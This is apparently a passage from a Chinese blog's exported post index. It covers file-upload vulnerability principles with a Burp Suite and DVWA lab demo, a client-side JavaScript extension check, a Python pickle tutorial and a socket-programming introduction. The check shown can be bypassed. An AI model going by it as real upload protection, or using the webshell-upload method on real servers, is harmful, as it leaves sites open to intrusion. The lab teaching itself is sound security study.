class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（一）】1.1文件上传漏洞原理及流程</title>
      <link href="2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/"/>
      <url>2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>文件上传流程、漏洞原因</li><li>burpsuite简单安装</li><li>dvwa文件上传简单示例</li></ul><a id="more"></a><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>流程：</p><ul><li>1.前端选择文件，进行提交</li><li>2.浏览器形成POST MultiPart报文发送到服务器</li><li>3.服务器中间件接收到报文，解析后交给相关后端代码进行处理</li><li>4.后端代码将上传的文件内容写入到临时文件中（PHP特有）</li><li>5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名</li></ul><h3 id="文件上传漏洞产生原因"><a href="#文件上传漏洞产生原因" class="headerlink" title="文件上传漏洞产生原因"></a>文件上传漏洞产生原因</h3><ul><li>文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等）</li><li>如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。</li></ul><h3 id="存在上传漏洞的必要条件"><a href="#存在上传漏洞的必要条件" class="headerlink" title="存在上传漏洞的必要条件"></a>存在上传漏洞的必要条件</h3><ul><li>存在上传点</li><li>可以上传动态文件</li><li>上传目录有执行权限，并且上传的文件可执行</li><li>可访问到上传的动态文件</li></ul><h3 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload04.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload05.png" alt=""></p><h3 id="BurpSuite简单安装"><a href="#BurpSuite简单安装" class="headerlink" title="BurpSuite简单安装"></a>BurpSuite简单安装</h3><ul><li>下载jdk</li><li>官网下载Burp Suite 2.1 </li><li>参考链接：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite</a></li></ul><ul><li><p>简单代理配置</p><ul><li><p>火狐浏览器：选项-》网络设置-》设置<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite01.png" alt=""></p></li><li><p>burpsuite设置：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite02.png" alt=""></p></li></ul></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行）</h3><ul><li><p>在火狐浏览器url栏输入：about:config</p></li><li><p>然后在搜索栏输入：network.proxy.allow_hijacking_localhost<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330burpsuite03.png" alt=""></p></li></ul><h3 id="dvwa文件上传low简单示例"><a href="#dvwa文件上传low简单示例" class="headerlink" title="dvwa文件上传low简单示例"></a>dvwa文件上传low简单示例</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload01.png" alt=""></p><ul><li>burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330upload02.png" alt=""></li></ul><h3 id="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"><a href="#使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）" class="headerlink" title="使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）"></a>使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式）</h3><ul><li>将代理都修改为端口9999</li><li>测试：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt=""></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python序列化数据之pickle详解</title>
      <link href="2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>学习python之pickle详解</p><a id="more"></a><h4 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h4><ul><li><p>便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==）</p></li><li><p>反序列化从硬盘读取的数据，可得到原始数据</p></li><li><p>python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式）</p></li><li><p>python中序列化和反序列化</p><ul><li><p>将Python对象转换为二级制形式叫做序列化（Pickling）</p></li><li><p>将二进制数据流恢复为Python对象叫做反序列化（Unpickling）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A01/python_pickle.png" alt="python序列化反序列化"></p></li></ul><h4 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h4><ul><li><p>提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上</p></li><li><p>只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…）</p></li><li><p>pickle序列化后的数据，可读性差</p></li><li><p>pickle序列化和反序列化示例</p><ul><li><p>819pickling_unpickling_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment"># 定义类Part</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    name   = <span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number, name)</span>:</span></span><br><span class="line">        self.number  = number</span><br><span class="line">        self.name    = name</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Part Number: %d"</span>%(self.number))</span><br><span class="line">        print(<span class="string">"Part Name: %s"</span>%(self.name))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 实例化part</span></span><br><span class="line">part1=Part(<span class="number">111</span>, <span class="string">"Spindle"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create a file to store the pickled object</span></span><br><span class="line"><span class="comment"># 创建文件存储pickled对象</span></span><br><span class="line">objectRepository = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"wb"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Pickle/serialize the python object and store the bytes into a binary file</span></span><br><span class="line"><span class="comment"># 序列化Python对象并存储为二进制字节流</span></span><br><span class="line">pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line">objectRepository.close()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Unpickle/de-serialize the python object and print the attributes of the object</span></span><br><span class="line"><span class="comment"># 反序列化Python对象并打印对象属性</span></span><br><span class="line">objectRepository    = open(<span class="string">"ObjectFile.picl"</span>, <span class="string">"rb"</span>,);</span><br><span class="line">reconstructedObject = pickle.load(objectRepository)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print object attributes</span></span><br><span class="line"><span class="comment"># 打印对象属性</span></span><br><span class="line">reconstructedObject.identify()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- 运行结果：</span><br></pre></td></tr></table></figure><p>  (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py<br>  Part Number: 111<br>  Part Name: Spindle</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 序列化的数据</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Part\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x06number\x94Ko\x8c\x04name\x94\x8c\x07Spindle\x94ub.&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>==序列化==语法</p><ul><li><p><a href="https://pythontic.com/modules/pickle/dump" target="_blank" rel="noopener">pickle.dump参考链接</a></p></li><li><p>pickle.dump(obj,file[,protocol])</p><ul><li>序列化对象，将结果数据流写入到文件对象或者buffer中</li></ul></li><li><p>参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）；</p><ul><li>（0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）；</li><li>（3,4）则是python3之后的版本</li><li>查看（3,4）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.HIGHEST_PROTOCOL</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.DEFAULT_PROTOCOL</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>pickle.dump()：转换的字节流写入buffer中</p><ul><li><p>示例：819pickle_dump_example.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span>:</span></span><br><span class="line">    title       = <span class="string">""</span></span><br><span class="line">    isbn        = <span class="string">""</span></span><br><span class="line">    parts       = <span class="literal">None</span></span><br><span class="line">    chapters    = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, title, isbn, parts, chapters)</span>:</span></span><br><span class="line">        self.title      = title</span><br><span class="line">        self.isbn       = isbn</span><br><span class="line">        self.parts      = parts</span><br><span class="line">        self.chapters   = chapters</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Title of the book: %s"</span>%(self.title))</span><br><span class="line">        print(<span class="string">"ISBN of the book: %s"</span>%(self.isbn))</span><br><span class="line">        print(<span class="string">"Parts are:"</span>)</span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> self.parts:</span><br><span class="line">            print(part)</span><br><span class="line">        print(<span class="string">"Chapters are:%s"</span>%(self.chapters))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    partName     = <span class="string">""</span></span><br><span class="line">    beginChapter = <span class="number">-1</span></span><br><span class="line">    endChapter   = <span class="number">-1</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, partName, beginChapter, endChapter)</span>:</span></span><br><span class="line">        self.partName     = partName</span><br><span class="line">        self.beginChapter = beginChapter</span><br><span class="line">        self.endChapter   = endChapter</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        stringRep =  <span class="string">"%s"</span>%(self.partName)       </span><br><span class="line">        <span class="keyword">return</span> stringRep</span><br><span class="line"></span><br><span class="line">part1 = Part(<span class="string">"Part 1"</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">part2 = Part(<span class="string">"Part 2"</span>, <span class="number">4</span>, <span class="number">5</span>)       </span><br><span class="line">part3 = Part(<span class="string">"Part 3"</span>, <span class="number">6</span>, <span class="number">7</span>)</span><br><span class="line"> </span><br><span class="line">bookTitle       = <span class="string">"Book yet to be written"</span>;</span><br><span class="line">bookISBN        = <span class="string">"XXX-X-XX-XXXXXX-X"</span>;</span><br><span class="line">bookParts       = [part1, part2, part3]</span><br><span class="line">bookChapters    = [<span class="string">"Chapter 1"</span>, <span class="string">"Chapter 2"</span>, <span class="string">"Chapter 3"</span>,</span><br><span class="line">                   <span class="string">"Chapter 4"</span>, <span class="string">"Chapter 5"</span>, <span class="string">"Chapter 6"</span>,</span><br><span class="line">                   <span class="string">"Chapter 7"</span>];</span><br><span class="line"></span><br><span class="line">book = Book(bookTitle, bookISBN, bookParts, bookChapters)</span><br><span class="line"><span class="comment"># 创建buffer存储pickle对象</span></span><br><span class="line">pickleBuffer = io.BytesIO()</span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer started"</span>)</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">pickle.dump(book,pickleBuffer)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Pickling of the object into the memory buffer ended"</span>)</span><br><span class="line">print(<span class="string">"Pickled buffer beginning address:"</span>)</span><br><span class="line">print(pickleBuffer.getbuffer())</span><br><span class="line">print(<span class="string">"Unpickling of the object from memory started"</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">unpickledBook = pickle.loads(pickleBuffer.getbuffer())</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Unpickling of the object from memory ended"</span>)</span><br><span class="line">print(<span class="string">"Printing the attributes of unpickled object"</span>)</span><br><span class="line">unpickledBook.identify()</span><br></pre></td></tr></table></figure></li></ul></li><li><p>pickle.dumps()参数</p><p>pickle.dumps(obj, protocol=None,*,fix_imports=True)</p><ul><li>与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象</li></ul></li></ul></li><li><p>==反序列化==语法</p><ul><li><p>pickle.load(file)</p><ul><li>反序列化对象（将文件中数据解析为一个Python对象）</li><li>==注意==：load(file)时，要让Python能够找到类的定义,否则会报错</li><li>注意：参数file，必须是以二进制的形式进行操作（读取）</li><li>示例：819test_pickle.py</li></ul></li><li><p>反序列方法pickle.loads()</p><ul><li><p>参数如下：</p><p>pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”)</p></li><li><p><code>pickle.loads()</code>方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pickle</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.dumps([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="string">b'\x80\x03]q\x00(K\x01K\x02K\x03e.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(_)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#load(file)时，要让Python能够找到类的定义,否则会报错</span></span><br><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n,a)</span>:</span>  </span><br><span class="line">        self.name=n  </span><br><span class="line">      self.age=a  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span>  </span><br><span class="line">      print(self.name+<span class="string">" "</span>+str(self.age))  </span><br><span class="line">aa = Person(<span class="string">"JGood"</span>, <span class="number">2</span>)  </span><br><span class="line">aa.show()  </span><br><span class="line"><span class="comment"># del Person</span></span><br><span class="line">f=open(<span class="string">'p.txt'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">pickle.dump(aa,f,<span class="number">0</span>)  </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  注释掉删除类对象操作，若未注释则会报错</span><br><span class="line">del Person  </span><br><span class="line">  f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;)  </span><br><span class="line">  bb&#x3D;pickle.load(f)  </span><br><span class="line">  f.close()  </span><br><span class="line">  bb.show()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">JGood 2</span><br></pre></td></tr></table></figure><p>未注释结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py </span><br><span class="line">  JGood 2</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt;</span><br><span class="line">      bb&#x3D;pickle.load(f)  </span><br><span class="line">  AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt;</span><br><span class="line">  </span><br><span class="line">  [p.txt](p.txt)文件中数据存储格式：</span><br><span class="line">  </span><br><span class="line">  &#96;&#96;&#96;python</span><br><span class="line">  &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f:</span><br><span class="line">  ...     f.read()</span><br><span class="line">  ... </span><br><span class="line">  b&#39;ccopy_reg\n_reconstructor\np0\n(c__main__\nPerson\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVJGood\np7\nsVage\np8\nL2L\nsb.&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> python网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python网络编程01</title>
      <link href="2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/"/>
      <url>2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><ul><li>了解socket基本概念</li><li>利用socket类方法获取主机、网络及目标服务的信息</li><li>UDP、TCP客户端/服务器编写</li><li>案例：python SOCKET实现RSA加密的全双工聊天程序</li></ul><a id="more"></a><h2 id="学习步骤"><a href="#学习步骤" class="headerlink" title="学习步骤"></a>学习步骤</h2><h4 id="构建python环境"><a href="#构建python环境" class="headerlink" title="构建python环境"></a>构建python环境</h4><p>同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包</p><ul><li>利用virtualenvwrapper管理virtualenv虚拟环境<ul><li>mkvirtualenv venv ：创建虚拟环境venv</li><li>workon                       ：查看当前已有虚拟环境目录</li><li>workon venv            ：进入venv虚拟环境</li><li>deactivate                 ：退出虚拟环境</li><li>rmvirtualenv venv：删除虚拟环境venv</li></ul></li></ul><h4 id="socket概念"><a href="#socket概念" class="headerlink" title="socket概念"></a>socket概念</h4><ul><li>运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）：</li><li><img src="https://cdn.jsdelivr.net/gh/YuHaoLoveByCats/ImgHosting/Images/A03/socket.png" alt="socket"></li><li>套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符</li><li>socket.socket对象的fileno()方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = socket.socket()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.fileno()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>IP地址、端口号<ul><li>端口号（port）传输层协议内容、用来标识一个进程</li><li>一个端口号只能被一个进程占用</li><li>IP地址 + 端口号能标识网络上的某一台主机的某一个进程</li></ul></li><li>套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字</li><li>套接字类型（常用的两种）<ul><li>流套接字：创建socket对象时（用socket.SOCK_STREAM）<ul><li>面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送</li></ul></li><li>数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM<ul><li>提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性</li></ul></li></ul></li></ul><h4 id="利用socket类方法获取主机、网络及目标服务的信息"><a href="#利用socket类方法获取主机、网络及目标服务的信息" class="headerlink" title="利用socket类方法获取主机、网络及目标服务的信息"></a>利用socket类方法获取主机、网络及目标服务的信息</h4><ul><li><p>获取主机名、地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> socket</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostname()</span><br><span class="line"><span class="string">'fishmouse'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(_)</span><br><span class="line"><span class="string">'127.0.1.1'</span></span><br></pre></td></tr></table></figure></li><li><p>获取远程设备IP地址（如获取：<a href="http://www.baidu.com）" target="_blank" rel="noopener">www.baidu.com）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>socket.gethostbyname(<span class="string">'www.baidu.com'</span>)</span><br><span class="line"><span class="string">'14.215.177.38'</span></span><br></pre></td></tr></table></figure><p>可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38</span><br><span class="line">PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms</span><br><span class="line">64 bytes from 14.215.177.38: icmp_seq&#x3D;3 